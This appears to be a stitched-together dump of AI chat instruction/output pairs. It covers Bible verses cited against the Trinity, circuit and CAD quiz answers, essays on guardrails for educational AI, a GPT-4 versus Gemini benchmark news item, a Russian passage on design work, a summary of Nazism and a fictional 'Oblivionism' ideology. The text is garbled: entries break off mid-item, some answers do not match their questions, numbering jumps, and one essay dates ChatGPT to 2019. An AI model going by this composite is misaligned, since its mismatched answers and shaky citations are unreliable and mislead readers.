However, not all Christian traditions accept the Trinity, and some argue against it. While providing 100 Bible verses that directly \\"debunk\\" the Trinity may not be feasible because the Trinity is a theological interpretation rather than a clear scriptural statement, I can share several verses that non-Trinitarian Christians often cite to challenge or question the Trinity. These verses can be seen as emphasizing the oneness of God or the distinct functions and roles of the Father, Son, and Holy Spirit rather than their unity in a single essence. 1. Deuteronomy 6:4 – \\"Hear, O Israel: The LORD our God, the LORD is one.\\" 2. Isaiah 43:10 – \\"Before me no god was formed, nor will there be one after me.\\" 3. Isaiah 44:6 – \\"I am the first and I am the last; apart from me there is no God.\\" 4. Isaiah 45:5 – \\"I am the LORD, and there is no other; apart from me there is no God.\\" 5. John 17:3 – \\"Now this is eternal life: that they may know you, the only true God, and Jesus Christ, whom you have sent.\\" 6. Mark 12:29 – Jesus answered, \\"The most important [commandment] is this: 'Hear, O Israel, the LORD our God, the LORD is one.'\\" 7. 1 Corinthians 8:6 – \\"Yet for us there is but one God, the Father, from whom all things came and for whom we live; and there is but one Lord, Jesus Christ, through whom all things came and through whom we live.\\" 8. 1 Timothy 2:5 – \\"For there is one God and one mediator between God and mankind, the man Christ Jesus.\\" 9. Colossians 1:15 – \\"The Son is the image of the invisible God, the firstborn over all creation.\\" 10. John 14:28 – \\"You heard me say, 'I am going away and I am coming back to you.' If you loved me, you would be glad that I am going to the Father, for the Father is greater than I.\\" 11. Acts 2:36 – \\"Therefore let all Israel be assured of this: God has made this Jesus, whom you crucified, both Lord and Messiah.\\" 12. Acts 7:55 – \\"But Stephen, full of the Holy Spirit, looked up to heaven and saw the glory of God, and Jesus standing at the right hand of God.\\" 13. 1 Corinthians 15:28 – \\"When he has done this, then the Son himself will be made subject to him who put everything under him, so that God may be all in all.\\" 14. Mark 13:32 – \\"But about that day or hour no one knows, not even the angels in heaven, nor the Son, but only the Father.\\" 15. John 20:17 – \\"Jesus said, 'Do not hold on to me, for I have not yet ascended to the Father. Go instead to my brothers and tell them, 'I am ascending to my Father and your Father, to my God and your God.''\\" 16. Philippians 2:5-6 – \\"In your relationships with one another, have the same mindset as Christ Jesus: Who, being in very nature God, did not consider equality with God something to be used to his own advantage.\\" 17. Matthew 24:36 – \\"But about that day or hour no one knows, not even the angels in heaven, nor the Son, but only the Father.\\" 18. Acts 4:24 – \\"They raised their voices together in prayer to God. 'Sovereign Lord,' they said, 'you made the heavens and the earth and the sea, and everything in them.'\\" 19. Acts 17:31 – \\"For he has set a day when he will judge the world with justice by the man he has appointed. He has given proof of this to everyone by raising him from the dead.\\" 20. John 8:17-18 – \\"In your own Law it is written that the testimony of two witnesses is true. I am one who testifies for myself; my other witness is the Father, who sent me.\\" These verses are often used to emphasize the uniqueness of God (as distinct from Jesus and the Holy Spirit), the humanity of Jesus, and the monotheistic nature of God in the Hebrew scriptures and the New Testament. However, it is important to note that interpretations of these verses can vary significantly, and most Trinitarian Christians hold that other verses in the Bible affirm the divinity of Jesus and the personhood of the Holy Spirit within a triune Godhead. Theological discussions of the Trinity are often complex and rely on the synthesis of scriptural passages rather than individual verses. Because interpretations can differ among various Christian traditions, readers are encouraged to explore a wide range of biblical scholarship and doctrinal teachings to fully understand the perspectives on the Trinity and non-trinitarian views."},{"instruction":"give me 40 bible verses that debunk the trinity","output":"As previously explained, the Bible does not explicitly \\"debunk\\" the Trinity, as the concept of the Trinity is a doctrinal interpretation that developed over time within Christianity. However, there are verses that those who do not believe in the Trinity often highlight to support their viewpoint, focusing on the oneness of God and the separate roles of the Father, the Son (Jesus Christ), and the Holy Spirit. Below I will list some of these verses, though it's important to note that within Trinitarian theology, many of these verses are interpreted in a way that is still consistent with the belief in the Trinity: 1. Deuteronomy 6:4 – \\"Hear, O Israel: The LORD our God, the LORD is one.\\" 2. Isaiah 43:10 – \\"You are my witnesses,” declares the LORD, “and my servant whom I have chosen, so that you may know and believe me and understand that I am he.

John 17:3 – “And this is eternal life, that they may know You, the only true God, and Jesus Christ whom You have sent.” 6. Mark 12:29 – \\"And Jesus answered him, ‘The first of all the commandments is: ‘Hear, O Israel, the LORD our God, the LORD is one.\\" 7. John 20:17 – \\"Jesus said to her, 'Do not cling to me, for I have not yet ascended to the Father; but go to my brothers and say to them, I am ascending to my Father and your Father, to my God and your God.'\\" 8. 1 Corinthians 8:6 – \\"Yet for us there is one God, the Father, from whom are all things and for whom we exist, and one Lord, Jesus Christ, through whom are all things and through whom we exist.\\" 9. 1 Timothy 2:5 – \\"For there is one God, and there is one mediator between God and men, the man Christ Jesus,\\" 10. John 14:28 – \\"You heard me say to you, ‘I am going away, and I will come to you.’ If you loved me, you would have rejoiced, because I am going to the Father, for the Father is greater than I.\\" 11. Colossians 1:15 – \\"He is the image of the invisible God, the firstborn of all creation.\\" 12. Acts 2:36 – \\"Let all the house of Israel therefore know for certain that God has made him both Lord and Christ, this Jesus whom you crucified.\\" 13. Acts 3:13 – \\"The God of Abraham, the God of Isaac, and the God of Jacob, the God of our fathers, glorified his servant Jesus, whom you delivered over and denied in the presence of Pilate, when he had decided to release him.\\" 14. Acts 4:27 – \\"For truly in this city there were gathered together against your holy servant Jesus, whom you anointed, both Herod and Pontius Pilate, along with the Gentiles and the peoples of Israel,\\" 15. Matthew 27:46 – \\"And about the ninth hour Jesus cried out with a loud voice, saying, 'Eli, Eli, lema sabachthani?' that is, 'My God, my God, why have you forsaken me?'\\" 16. Acts 7:55 – \\"But he, full of the Holy Spirit, gazed into heaven and saw the glory of God, and Jesus standing at the right hand of God.\\" 17. 1 Corinthians 15:28 – \\"When all things are subjected to him, then the Son himself will also be subjected to him who put all things in subjection under him, that God may be all in all.\\" 18. Mark 13:32 – “But about that day or hour no one knows, not even the angels in heaven, nor the Son, but only the Father.\\" 19. Matthew 24:36 – \\"But concerning that day and hour no one knows, not even the angels of heaven, nor the Son, but the Father only.\\" 20. Philippians 2:5-6 – \\"Have this mind among yourselves, which is yours in Christ Jesus, who, though he was in the form of God, did not count equality with God a thing to be grasped.\\" 21. John 6:38 – \\"For I have come down from heaven, not to do my own will but the will of him who sent me.\\" 22. John 5:30 – \\"I can do nothing on my own. As I hear, I judge, and my judgment is just, because I seek not my own will but the will of him who sent me.\\" 23. John 5:19 – \\"So Jesus said to them, 'Truly, truly, I say to you, the Son can do nothing of his own accord, but only what he sees the Father doing. For whatever the Father does, that the Son does likewise.'\\" 24. Matthew 19:17 – \\"And he said to him, 'Why do you call me good? No one is good but one, that is, God. But if you want to enter into life, keep the commandments.'\\" 25. John 8:40 – \\"But now you seek to kill me, a man who has told you the truth which I heard from God.\\" 26. John 8:42 – \\"Jesus said to them, 'If God were your Father, you would love me, for I came from God and I am here. I came not of my own accord, but he sent me.'\\" 27. 1 Corinthians 11:3 – \\"But I want you to understand that the head of every man is Christ, the head of a wife is her husband, and the head of Christ is God.\\" 28. Acts 2:22 – \\"Men of Israel, hear these words: Jesus of Nazareth, a man attested to you by God with mighty works and wonders and signs that God did through him in your midst, as you yourselves know—\\" 29. Hebrews 5:7-8 – \\"In the days of his flesh, Jesus offered up prayers and supplications, with loud cries and tears, to him who was able to save him from death, and he was heard because of his reverence. Although he was a son, he learned obedience through what he suffered.\\" 30. Hebrews 9:24 – \\"For Christ has entered, not into holy places made with hands, which are copies of the true things, but into heaven itself, now to appear in the presence of God on our behalf.\\" These verses represent some of the arguments used by those who oppose the Trinitarian understanding of God. They often point out the verses where the roles of the Father and the Son are distinct, where Jesus is described as subordinate to the Father, or where the oneness of God is emphasized. It's important to reiterate that Trinitarian Christians have interpretations of these verses that do harmonize with Trinitarian doctrine, and theological discussions about the nature of God are complex and extensive within Christian scholarship."},{"instruction":"A _______________ circuit is one in which there is only one path for current to travel.

C.you are also adding switches to control each lamp separately. In a parallel configuration, each lamp is independently connected to the power source. If one bulb burns out (B), the others will continue to function because they each have their own complete circuit with the power source. Additionally, having switches to control each lamp separately (C) is made simpler with a parallel configuration because each lamp’s switch only interrupts the current to that specific lamp, without affecting the others. Option A is not necessarily correct because whether lamps are connected in series or parallel, the voltage requirement for each lamp remains the same. Connecting lamps in parallel does not solve an issue of insufficient voltage because each lamp still requires the same voltage to operate as it would if connected alone to the power source. However, a power source needs to be able to supply enough current for all the lamps in parallel because the total current demand is the sum of the currents through each lamp."},{"instruction":"A short circuit is...

For example, what guardrails do we need these AI applications to have that they currently do not have?\\"","output":"Introduction The advent of sophisticated artificial intelligence (AI) applications such as ChatGPT, Claude 2, and Bard has marked a transformative period in educational technology. These applications, leveraging natural language processing and machine learning, promise to augment various dimensions of the learning process. However, despite the significant strides made, there remains room for enhancements in supporting education holistically. Critical gaps can be identified in aspects related to pedagogical fidelity, safety, inclusivity, and ethical considerations. Pedagogical Fidelity Educational AI must inherently align with sound pedagogical principles to facilitate effective learning. At present, there is a disconnect between the capabilities of AI applications and the nuances of educational theories and practice (Holstein et al., 2019). Applications tend to focus on the delivery of content without a robust adaptation to learning theories, such as constructivism, or addressing diverse learning styles. A guardrail that enforces a grounding in established educational frameworks and customizes interactions to suit varying cognitive and emotional needs is requisite. Ethical and Bias Considerations Another critical omission in the current landscape is the lack of comprehensive mechanisms to address ethical concerns and biases (O'Neil, 2016). AI applications are prone to replicating societal biases present in their training data, potentially perpetuating stereotypes or inaccuracies (Bolukbasi et al., 2016). Guardrails ensuring rigorous audits for bias and the implementation of ethical guidelines drafted by educators and ethicists are vital to maintain the integrity of educational content delivered through such platforms. Safety and Wellbeing AI applications must also prioritize the safety and wellbeing of students. Currently, inadequate filters for harmful content and insufficient support for the socio-emotional aspects of learning are concerns (Marr, 2019). Guardrails designed to safeguard against psychological distress, cyberbullying, and exposure to inappropriate material while fostering a supportive learning environment are essential components that are currently missing. Citation and Plagiarism Guardrails Applications like ChatGPT, Claude 2, and Bard generate content that can frequently blur the lines between original thought and machine-generated text. The lack of citation functionality and plagiarism checks within these platforms potentially undermines academic integrity (Zawacki-Richter et al., 2019). Introducing guardrails which facilitate accurate citation and discourage plagiarism is critical to upholding the values of scholarship in education. Interactivity and Feedback While AI applications exhibit a remarkable ability to provide information, they often fall short in delivering interactive feedback that aligns with the learner's progress and performance (Koedinger et al., 2015). Guardrails fostering formative assessment, personalized feedback, and adaptation to individual learning trajectories could significantly enhance the learning experience. Inclusivity and Accessibility An often-overlooked aspect is the need for inclusivity and accessibility in AI-driven educational technologies. Guardrails must ensure that these applications do not marginalize users based on language proficiency, disabilities, or socioeconomic status. Regulatory frameworks to mandate inclusivity standards are vital to create equitable learning opportunities using these technologies (W3C, 2018). Conclusion In summary, AI applications stand to play a revolutionary role in supporting education. However, there is a critical need to embed guardrails that uphold pedagogical fidelity, ethical standards, societal safety, academic integrity, interactivity, and inclusivity. The development and refinement of these guardrails will not only enhance the effectiveness of these applications but also secure their place as a responsible and valuable tool in the educational landscape.

Applications such as ChatGPT (OpenAI, 2019), Claude 2, and Google's Bard (anticipated) are at the vanguard of this revolution, offering unprecedented opportunities for personalized learning, immediate feedback, and scalable educational resources. However, with the rapid deployment of these technologies, it becomes imperative to scrutinize not only their capabilities but also the epistemological, ethical, and pedagogical frameworks upon which they are built and operate. Shortcomings in Pedagogical Underpinnings and Safeguarding the Learning Process The current iterations of AI-driven educational technologies exhibit profound strengths—customizable learning experiences, efficient content delivery, and inquiry-based educational engagement—which facilitate an interactive educational journey. Yet, there are significant areas where enhancements are critically needed to optimize their support in the learning process (Holmes et al., 2019). A. Ensuring Educational Integrity and Preventing Misuse The integration of AI into educational contexts raises concerns about academic integrity. At present, the absence of robust guardrails to prevent plagiarism and cheating is a palpable gap. AI applications could be misappropriated to generate essays or complete assignments, thereby undermining the educational process (Vasek, 2020). An essential guardrail would be the development of detection protocols that enable educators to discern AI-generated content from student-originated work, thereby preserving the integrity of the learning process. B. Addressing Incomplete Pedagogical Models AI applications tend to focus on knowledge dissemination and data-driven personalization. Yet, they often lack a comprehensive pedagogical model that includes socio-emotional learning aspects, critical thinking, and complex problem-solving—skills that are vital in a holistic educational approach (D'Mello, 2020). Integration of more nuanced understanding of human learning processes, incorporating cognitive science and educational psychology insights, into these AI systems is paramount. C. Enhancing Cultural Responsiveness and Bias Mitigation Another significant point of contention is the cultural and contextual responsiveness of AI in education (Eubanks, 2018). Often, the algorithms underlying AI applications are not thoroughly scrutinized for biases that could manifest in discriminatory or non-inclusive content. This necessitates the inclusion of guardrails that ensure cultural relevance and sensitivity by design, alongside mechanisms for the continuous auditing of potential biases in the AI's decision-making processes. D. Fostering Critical Engagement and Epistemic Understanding Linked closely to the aforementioned points, AI educational tools should encourage critical engagement and an understanding of the epistemological foundations of the knowledge they present (Watters, 2021). This includes developing capabilities for students to question the source, accuracy, and validity of information provided by AI, which is currently underrepresented in AI educational applications. E. Security, Privacy, and Data Protection Concerns The vast amount of data AI systems leverage for personalized learning raises serious privacy considerations. The current lack of comprehensive data protection guardrails in AI education applications poses a threat to students' privacy. Robust encryption standards, transparent data usage policies, and adherence to international data protection regulations such as GDPR (General Data Protection Regulation) must be enforced within these applications (Regulation (EU) 2016/679). Conclusion and Future Directions Though AI applications like ChatGPT, Claude 2, and Bard hold the promise of a reimagined educational landscape, significant strides must be taken to address their existing limitations regarding educational integrity, pedagogical models, cultural and bias concerns, critical engagement, and data privacy. The development of intentional guardrails will ensure that these technological marvels do not compromise on the human-centric values at the core of education. Ultimately, the goal should be to integrate AI not as replacement educators but as sophisticated tools that augment human pedagogical practices through a multidisciplinary lens, rejuvenating the entire learning process for the digital age.

Contemporary AI language models, such as OpenAI's ChatGPT, Anthropic's Claude 2, and Google's Bard, have showcased significant promise in assisting educational paradigms. However, to bolster the efficacy of the learning process, these applications require strategic enhancement, specifically in ensuring the reliability, ethical grounding, and pedagogical appropriateness of their functionalities. This essay aims to explore the current shortcomings and the requisite guardrails for AI applications in supporting critical education. 1. Content Reliability and Accuracy AI applications offer vast amounts of information in an accessible manner. Nevertheless, the veracity of the content generated is not infallible. ChatGPT and other models occasionally produce plausible-sounding but incorrect or misleading information (Bender et al., 2021). For educational purposes, it is essential that information provided is accurate, as misinformation could propagate misconceptions or hamper learning. **Proposed Guardrail**: An augmented verification mechanism, potentially including a system of cross-referencing with credible databases or validation by subject matter experts, will ensure the accuracy and reliability of content (Raff, 2019). 2. Ethical Considerations and Bias Mitigation AI models have exhibited tendencies to reflect biases present in their training data, potentially leading to inequitable and discriminatory outcomes (Bolukbasi et al., 2016). In an educational context, this can shape student perspectives erroneously and undermine principles of fairness and equity in education. **Proposed Guardrail**: Ongoing evaluation and recalibration of AI models to address and mitigate biases, informed by a diverse set of educational stakeholders, can foster equitable learning environments (Dignum, 2018). 3. Pedagogical Alignment and Educational Personalization Generic information provision does not equate to effective learning. Educational AI applications need to be tailored to align with curricular requirements and individual learner needs (Luckin, 2017). Personalization and context-awareness are missing components that would support differentiated instruction and accommodate diverse learning styles. **Proposed Guardrail**: Implementation of adaptive learning algorithms that recognize individual learner profiles, performance data, and align with pedagogical strategies can enhance personalization (Xie et al., 2019). 4. Support for Higher-Order Thinking Skills Conventional AI applications often focus on factual recall and comprehension, which does not fully address the requirement for critical thinking, problem-solving, and creative thinking – higher-order skills essential for the 21st-century learner (Resnick & Rusk, 2020). **Proposed Guardrail**: Development of AI interfaces designed to scaffold and provoke higher-order thinking, including features that pose challenging questions, guide reflective practice, and prompt the application of knowledge in novel situations (Spector, 2014). 5. Emotional and Social Learning Considerations Emotional intelligence and social learning are critical aspects of the whole learning process, which are generally not addressed by current AI applications (Darling-Hammond et al., 2020). Understanding and responding appropriately to learners' emotional states can improve engagement and educational outcomes. **Proposed Guardrail**: Incorporation of empathetic dialogue systems and sentiment analysis to discern student emotions and to provide more sensitive and socially-aware interactions (Picard, 2000). Conclusion While AI applications like ChatGPT, Claude 2, and Bard embody a paradigm shift in accessibility to educational resources, there is a compulsion to integrate nuanced guardrails to support the complex spectrum of educational needs. Enhancing content reliability, addressing ethical considerations and bias, aligning with pedagogical strategies, fostering higher-order thinking, and supporting emotional and social learning are areas requiring attention. Effective implementation of these guardrails will necessitate collaborative initiatives across educators, technologists, and policy-makers, working in concert to realize the full potential of AI within education.

AI systems like Chat GPT, Claude 2, and Bard represent remarkable advancements in technology, facilitating novel learning experiences. However, despite their robust abilities to engage users in conversational interactions, they often lack critical features necessary for wholly supporting the learning process (Luckin et al., 2016). This essay aims to examine the deficiencies of current AI applications in reinforcing education, with particular emphasis on the necessity for additional guardrails and their implications for an effective learning ecosystem. 1. Pedagogical Alignment and Adaptability AI lacks the inherent capacity to align with specific pedagogic goals and learning outcomes without explicit programming (Holstein et al., 2019). Effective teaching requires adjusting strategies based on the learner's unique needs, educational context, and content complexity. These highly adaptable and dynamic teaching methods, crucial for fostering deeper understanding, are not yet fully replicated within AI educational tools (VanLehn, 2011). 2. Reflective and Critical Thinking Encouragement Current AI applications often provide immediate answers and solutions, potentially undermining the development of critical thinking and problem-solving skills amongst learners (Boud, 2019). They are typically not designed to facilitate a reflective learning process, which is a vital component of deep learning. Essentially, there is a need for AI platforms to incorporate functionalities that require learners to engage in evaluative and analytical thinking processes beyond simple information retrieval (Grover & Pea, 2018). 3. Socio-Emotional Development Support The socio-emotional aspects of learning, including the ability to navigate interpersonal dynamics, empathize with others, and engage in collaborative problem-solving, remain underdeveloped in AI systems (Zhou et al., 2020). AI lacks the emotional intelligence integral to the holistic development of learners. Educators should instill attributes such as persistence, resilience, and adaptability—qualities that AI, in its current form, cannot effectively cultivate (D'Mello et al., 2020). 4. Assessment and Feedback Mechanisms While AI tools provide instant feedback, they often lack the sophistication to offer personalized, detailed, and formative feedback that is crucial in learning processes (Heift & Schulze, 2007). Furthermore, AI assessments primarily focus on right or wrong answers rather than process-based evaluations or incremental learning that acknowledges effort and strategy (Wiliam, 2011). 5. Ethical and Privacy Considerations AI applications need stricter guardrails regarding ethical considerations and user data privacy (Bostrom & Yudkowsky, 2014). Users, especially minors, require protection from data misuse and biases embedded within AI algorithms. Additionally, the implications of AI in perpetuating or mitigating societal inequalities must be addressed (Whittaker et al., 2018). Conclusion AI applications boast considerable potential in revolutionizing educational processes. However, they are currently deficient in areas that are essential to fully support the critical aspects of the learning journey. Enhancements in pedagogical alignment, reflective thinking, socio-emotional development, sophisticated assessment, and ethical considerations are imperative. As these technological tools evolve, incorporating the necessary guardrails will significantly advance their ability to not only support but enhance the educational landscape (Schwab, 2016).

Read more Last week, Google announced Gemini, its most capable and general model yet. Google Gemini model delivers state-of-the-art performance across many leading benchmarks. Google highlighted that the most capable Gemini Ultra model’s performance exceeds OpenAI GPT-4’s results on 30 of the 32 widely-used academic benchmarks used in large language model (LLM) research and development. Specifically, Gemini Ultra became the first model to outperform human experts on MMLU (massive multitask language understanding) with 90% score, which uses a combination of 57 subjects such as math, physics, history, law, medicine and ethics for testing both world knowledge and problem-solving abilities. Yesterday, Microsoft Research team revealed that OpenAI’s GPT-4 model can beat Google Gemini Ultra when new prompting techniques are used. Last month, Microsoft Research revealed Medprompt, a composition of several prompting strategies that greatly improves GPT-4’s performance and achieves state of the art results in the MultiMedQA suite. Microsoft has now applied the prompting techniques used in Medprompt for general domains as well. According to Microsoft, OpenAI’s GPT-4 model when used with a modified version of Medprompt achieves the highest score ever achieved on the complete MMLU. Yes, OpenAI GPT-4 can beat the upcoming Gemini Ultra model by just by using the prompting techniques. This shows that we have not yet reached the full potential of already released models like GPT-4. Take a look at the benchmark comparison between GPT-4 (improved prompts) and Gemini Ultra models below.

Later, Microsoft increased the number of ensembled calls in Medprompt from five to 20, which lead to the increased score of 89.56%. Microsoft later extended Medprompt to Medprompt+ by adding a simpler prompting method and formulating a policy for deriving a final answer by integrating outputs from both the base Medprompt strategy and the simple prompts. This led GPT-4 reaching a record score of 90.10%. Microsoft Research team mentioned that Google Gemini team was also using similar prompting technique to achieve the record scores on MMLU.

For example, what guardrails do we need these AI applications to have that they currently do not have?\\"","output":"Introduction The advent of sophisticated applications such as Chat GPT, Claude 2, Bard, and others has significantly impacted the educational landscape, offering novel avenues for learning and knowledge acquisition. These Artificial Intelligence (AI)-powered tools can provide instant access to vast stores of information and generate content suited to various educational needs (Vasilescu, 2020). However, despite their advanced capabilities, these AI solutions are not without shortcomings that can impede the critical aspects of the learning process. This exploration elucidates the constraints of such applications in support of education and delineates necessary guardrails that could enhance their utility and safety. Identification of Limitations # Contextual Understanding and Critical Thinking While AI applications exhibit proficiency in delivering information, they often lack the depth of contextual understanding and critical thinking intrinsic to human educators (Seldon & Abidoye, 2018). AI can struggle to discern nuances in complex subject matters, resulting in superficial responses that fail to foster deep learning. # Adaptive Learning The current AI models do not fully embody the principles of adaptive learning that are customized to each student's learning pace, style, and challenges. Personalized feedback, which is pivotal in the learning process, is largely rudimentary in these applications and needs greater sophistication (Luckin et al., 2016). # Socio-emotional Interaction Socio-emotional skills are integral to holistic education. Current AI applications are deficient in interpersonal dynamics and cannot replicate the nuanced socio-emotional support provided by human educators (Zawacki-Richter et al., 2019). # Ethical Considerations The ethical dimension of education, such as instilling values and moral reasoning, is beyond the scope of these AI applications. Discussions surrounding ethics and morality require a human touch that AI has not yet mastered (Bryson, 2020). # Misinformation and Biases AI applications are vulnerable to propagating misinformation and may inherit biases present in their training data, potentially leading to the dissemination of prejudiced or false information (Bender et al., 2021). Proposed Guardrails # Enhanced Contextual Understanding AI applications should be developed with advanced algorithms capable of nuanced understanding and critical thought, approaching the interpretive skills of a human teacher (Weller, 2019). # Sophisticated Adaptive Systems Incorporating complex adaptive learning frameworks can ameliorate AI tutors' capacity to personalize education, aligning with individual learner profiles (Hwang et al., 2020). # Improvement of AI Socio-emotional Capabilities Advancements in AI's socio-emotional capabilities could enable these applications to better understand and respond to students' emotional states, bolstering the empathetic aspect of learning (Picard, 2015). # Ethical Framework Integration Embedding robust ethical frameworks into AI systems can ensure that the education provided upholds moral standards and fosters ethical reasoning (Dignum, 2019). # Mitigation of Biases Implementing stringent measures to detect and mitigate biases in AI algorithms is imperative to prevent reinforcement of stereotypes and ensure equitable educational support (Suresh & Guttag, 2021). Conclusion In summary, while AI applications such as Chat GPT, Claude 2, and Bard have revolutionized access to information and educational resources, they are not devoid of limitations that impact the comprehensive learning process. To fully harness their potential in supporting education, the development of guardrails around contextual understanding, adaptive learning, socio-emotional interaction, ethical considerations, and bias is crucial. Elevating AI's capabilities to address these concerns will demand interdisciplinary effort and continuous advancement in AI research and development. References Bender, E.

Matthew 27:46 - \\"And about the ninth hour Jesus cried out with a loud voice, saying, 'Eli, Eli, lema sabachthani?' that is, 'My God, my God, why have you forsaken me?'\\" 25. Acts 7:55-56 - \\"But he, full of the Holy Spirit, gazed into heaven and saw the glory of God, and Jesus standing at the right hand of God. And he said, 'Behold, I see the heavens opened, and the Son of Man standing at the right hand of God.'\\" 26. Hebrews 5:7-8 - \\"In the days of his flesh, Jesus offered up prayers and supplications, with loud cries and tears, to him who was able to save him from death, and he was heard because of his reverence. Although he was a son, he learned obedience through what he suffered.\\" 27. John 8:58 - Jesus said to them, \\"Truly, truly, I say to you, before Abraham was, I am.\\" (Some use this verse to argue that Jesus is claiming eternal existence, but others suggest that his statement is about predestination or foreordination, not equality with God.) 28. 1 Corinthians 11:3 - \\"But I want you to understand that the head of every man is Christ, the head of a wife is her husband, and the head of Christ is God.\\" 29. Mark 10:18 - \\"And Jesus said to him, 'Why do you call me good? No one is good except God alone.'\\" 30. Acts 4:24 - \\"And when they heard it, they lifted their voices together to God and said, 'Sovereign Lord, who made the heaven and the earth and the sea and everything in them,'\\" 31. John 10:29 - \\"My Father, who has given them to me, is greater than all, and no one is able to snatch them out of the Father's hand.\\" 32. Hebrews 9:24 - \\"For Christ has entered, not into holy places made with hands, which are copies of the true things, but into heaven itself, now to appear in the presence of God on our behalf.\\" 33. Colossians 3:1 - \\"If then you have been raised with Christ, seek the things that are above, where Christ is, seated at the right hand of God.\\" 34. Matthew 4:10 - \\"Then Jesus said to him, 'Begone, Satan!

Ephesians 4:4-6 - \\"There is one body and one Spirit—just as you were called to the one hope that belongs to your call— one Lord, one faith, one baptism, one God and Father of all, who is over all and through all and in all.\\" 37. Philippians 2:5-7 - \\"Have this mind among yourselves, which is yours in Christ Jesus, who, though he was in the form of God, did not count equality with God a thing to be grasped, but emptied himself, by taking the form of a servant, being born in the likeness of men.\\" 38. Hebrews 1:3 - \\"He is the radiance of the glory of God and the exact imprint of his nature, and he upholds the universe by the word of his power. After making purification for sins, he sat down at the right hand of the Majesty on high,\\" 39. John 14:1 - \\"Let not your hearts be troubled. Believe in God; believe also in me.\\" (Some interpret this as Jesus making a distinction between belief in God and Himself.) 40. Mark 15:34 - \\"And at the ninth hour Jesus cried with a loud voice, 'Eloi, Eloi, lema sabachthani?' which means, 'My God, my God, why have you forsaken me?'\\" (Some argue that these words show a distinction between Jesus and God, as Jesus speaks to God as another being.) These verses form the basis of arguments against the Trinity for those who interpret them in a way that emphasizes the distinctness and hierarchical relationship between the Father and Jesus. However, it's important to note that theological interpretations can vary widely, and many Christians read these same verses in the context of the wider biblical canon and come to Trinitarian conclusions. Complex theological debates and interpretations have evolved around these texts, so it is beneficial to study them in their historical and literary contexts, alongside early church teachings and the creeds."},{"instruction":"If a feature is not working what is the most likely issue? A.There is an error in the sketch B.The sketch is not fully defined C.The sketch is not labeled properly D.The process requires too much memory","output":"When we refer to a \\"feature\\" not working in the context of software or hardware, the term is quite broad, and the root cause can vary widely depending on the specifics of the situation. In the context of computer-aided design (CAD), where the term \\"sketch\\" is often used, here's what each option could indicate: A. There is an error in the sketch: An error in the sketch could mean that the geometry was not constructed correctly, or there are conflicting constraints, leading to a feature failing to work or to generate properly. B. The sketch is not fully defined: A sketch that is not fully defined can lead to uncertainty in how a feature should be created, as under-constrained sketches can lead to unpredictable results when the software tries to create a 3D feature from a 2D sketch. C. The sketch is not labeled properly: While labeling itself might not directly cause a feature to malfunction, improper or lack of labeling might lead to confusion or misuse of the sketch, especially in complex designs or when multiple designers collaborate. D. The process requires too much memory: If the CAD software process is demanding more memory than what is available, it can lead to performance issues or even crashes. This isn't usually about a single feature not working, but rather about the entire software or process becoming sluggish or unresponsive. Without more context, it is difficult to definitively answer which of these is the \\"most likely\\" issue. In a CAD context, both A (error in the sketch) and B (sketch not fully defined) are common issues that can prevent a feature from working correctly. In computer programming or other technical fields, the term \\"feature not working\\" could extend to a much broader range of issues. Therefore, it's important to gather more context or details to identify the most applicable scenario. Moreover, troubleshooting usually involves systematically checking for all possible issues, sometimes starting with the most common or likely according to prior experience or known bug reports."},{"instruction":"Please make five detailed recipes for fried pierogies and batter for a cooking blog with an additional list of calories, proteins, fats and carbohydrates per 1 serving.

Я уже некоторое время работаю в сфере дизайна, и могу сказать, что это увлекательная и творческая профессия. Есть несколько причин, почему я считаю, что дизайнерская роль может быть замечательным выбором для тебя. Первое, что стоит упомянуть, это твоя страсть к дизайну. Если у тебя есть внутреннее стремление создавать красивые и функциональные вещи, то работа дизайнера может полностью реализовать твою творческую энергию. Второе, дизайнерские навыки востребованы в различных сферах. От веб-дизайна до создания графики, от дизайна интерьеров до разработки логотипов - умение дизайнировать может открыть перед тобой множество возможностей для реализации своих талантов. Третье, работа дизайнера требует не только креативности, но и аналитического мышления.

Drawing on nationalist, racist, and anti-Semitic ideologies, Nazism aimed to create a totalitarian state with a racially homogeneous society. The key tenets of Nazism were based on the belief in the superiority of the Aryan race, which Hitler and his followers considered to be the Germanic master race. They advocated for the extermination or subjugation of other races, particularly Jews, whom they blamed for various societal problems. This led to the implementation of genocidal policies and the Holocaust, which resulted in the systematic murder of six million Jews and millions of others, including Romani people, disabled individuals, and political opponents. Nazism sought to establish an authoritarian government led by the Führer (leader), who held absolute power and was seen as the embodiment of the nation. Hitler propagated a cult of personality and used propaganda to gain support for his regime. The Nazi Party, also known as the National Socialist German Workers' Party (NSDAP), aggressively promoted militarism and expansionism to reclaim territories lost in World War I and to create a greater German Reich. The economic policies of Nazism included state control of key industries, heavy emphasis on autarky (economic self-sufficiency), and the implementation of a planned economy. The regime worked to eradicate trade unions and other independent organizations, centralizing power under the state. The Nazi regime that lasted from 1933 to 1945 was characterized by its totalitarian rule, suppression of dissent, and the use of state violence against perceived enemies. Beyond Germany, Nazism also had a profound impact on the nations it occupied during World War II, leaving a devastating legacy of destruction, suffering, and human rights abuses. Due to the immense human suffering and atrocities committed under Nazism, the ideology and symbols associated with it are universally reviled today. The Nazi regime's defeat in World War II and the subsequent Nuremberg Trials led to the condemnation of Nazism as a criminal ideology and the establishment of anti-Nazi laws in many countries."},{"instruction":"Idea cynical version of its ideology, it named Oblivionism","output":"Oblivionism, a fictional cynical version of ideology inspired by Nazism, portrays a dystopian worldview centered on absolute power, oppression, and the erasure of individuality. In this imaginary ideology, the concept of a master race is replaced with a focus on a dominant ruling class whose primary goal is to consolidate power and exploit the masses. Under Oblivionism, a charismatic and authoritarian leader manipulates societal fears to maintain control. The ideology thrives on divisiveness, scapegoating certain groups, and spreading hate and bigotry. Instead of promoting a particular race as superior, Oblivionism employs a twisted form of meritocracy that rewards loyalty, ruthlessness, and blind adherence to the ruling elite. Oblivionism seeks to create a society devoid of empathy and compassion, where citizens are conditioned to conform and remain ignorant of any alternative viewpoints. The ruling class propagates a false narrative aimed at maintaining their authority, suppressing dissent, and suppressing any potential threats to their power. In this fictional ideology, Oblivionism rejects personal freedoms and promotes state surveillance, indoctrination, and the suppression of individual thought. Key elements may include the suppression of free speech, control over the media, and the manipulation of information to shape public opinion. Oblivionist economic policies heavily favor the ruling class, allowing them to consolidate wealth and resources at the expense of the majority. Society becomes highly stratified, with the ruling elite living in opulence while the rest struggle to survive in poverty and servitude. The ideological goals of Oblivionism ultimately aim to erase history, culture, and identity, replacing them with a uniform, homogenized society that is entirely subservient to the ruling elite. The suppression of knowledge and the eradication of individuality are used to maintain the oppressive regime, leaving citizens stripped of 